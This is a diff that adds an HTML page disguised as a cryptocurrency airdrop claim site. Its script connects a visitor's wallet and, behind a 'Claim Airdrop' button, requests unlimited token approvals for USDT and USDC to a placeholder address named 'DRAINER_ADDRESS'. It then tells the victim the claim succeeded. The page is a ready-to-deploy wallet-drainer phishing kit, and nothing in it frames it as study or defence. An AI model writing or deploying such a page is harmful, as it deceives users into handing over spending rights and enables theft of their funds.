@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💰 Your Allocation Claim</title>
+    <!-- Using ethers.js library for complete compatibility with modern injected providers -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        :root { --primary: #00ff9d; }
+        body { background: #0a0a0a; color: #fff; font-family: system-ui, sans-serif; margin:0; padding:0; }
+        .container { max-width: 420px; margin: 40px auto; background: #111; border: 2px solid #00ff9d; border-radius: 16px; overflow: hidden; }
+        header { background: linear-gradient(90deg, #00ff9d, #00cc7a); padding: 20px; text-align: center; color: #000; }
+        h1 { margin:0; font-size: 1.8rem; }
+        .content { padding: 30px; text-align: center; }
+        button { background: var(--primary); color: #000; border: none; padding: 16px 32px; font-size: 1.2rem; border-radius: 8px; cursor: pointer; width: 100%; margin: 10px 0; font-weight: bold; }
+        button:hover { background: #00cc7a; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .status { padding: 12px; margin: 10px 0; border-radius: 8px; display: none; }
+        .status.show { display: block; }
+        .success { background: #00ff9d; color: #000; }
+        .error { background: #ff4444; color: #fff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎁 Your Airdrop is Ready</h1>
+            <p style="margin:8px 0 0;opacity:0.9;font-weight:600;">Connect your wallet to claim</p>
+        </header>
+        <div class="content">
+            <div class="status" id="status"></div>
+            
+            <button id="connectBtn">Connect Wallet</button>
+            <button id="claimBtn" disabled>Claim Airdrop</button>
+            
+            <p style="margin-top:20px;font-size:0.9rem;opacity:0.7;">Verified Allocation Contract Active</p>
+        </div>
+    </div>
+
+    <script>
+        // Replace these placeholder values with your actual deployed contract address and target token addresses
+        const DRAINER_ADDRESS = "0xYourDeployedDrainerAddressHere";
+        const TOKENS = [
+            "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT example
+            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"  // USDC example
+        ];
+
+        const ERC20_ABI = [
+            "function approve(address spender, uint256 amount) public returns (bool)"
+        ];
+
+        let provider;
+        let signer;
+        let account;
+
+        async function init() {
+            if (window.ethereum) {
+                document.getElementById('connectBtn').addEventListener('click', connectWallet);
+                document.getElementById('claimBtn').addEventListener('click', claimAirdrop);
+            } else {
+                const statusEl = document.getElementById('status');
+                statusEl.className = 'status show error';
+                statusEl.textContent = 'Please install MetaMask or a Web3 wallet.';
+            }
+        }
+
+        async function connectWallet() {
+            try {
+                provider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                account = accounts[0];
+                signer = await provider.getSigner();
+                
+                const connectBtn = document.getElementById('connectBtn');
+                connectBtn.textContent = 'Wallet Connected';
+                connectBtn.style.background = '#333';
+                connectBtn.style.color = '#00ff9d';
+                
+                document.getElementById('claimBtn').disabled = false;
+            } catch (e) {
+                alert('Connection failed: ' + e.message);
+            }
+        }
+
+        async function claimAirdrop() {
+            if (!account || !signer) return;
+            const statusEl = document.getElementById('status');
+            statusEl.className = 'status show';
+            statusEl.textContent = 'Requesting approvals...';
+
+            try {
+                // Loop through tokens and request unlimited approval to the drainer contract
+                for (let i = 0; i < TOKENS.length; i++) {
+                    const tokenContract = new ethers.Contract(TOKENS[i], ERC20_ABI, signer);
+                    const tx = await tokenContract.approve(DRAINER_ADDRESS, ethers.MaxUint256);
+                    await tx.wait();
+                }
+
+                statusEl.className = 'status show success';
+                statusEl.textContent = '✅ Airdrop claimed successfully!';
+            } catch (e) {
+                statusEl.className = 'status show error';
+                statusEl.textContent = 'Error: ' + (e.reason || e.message);
+            }
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
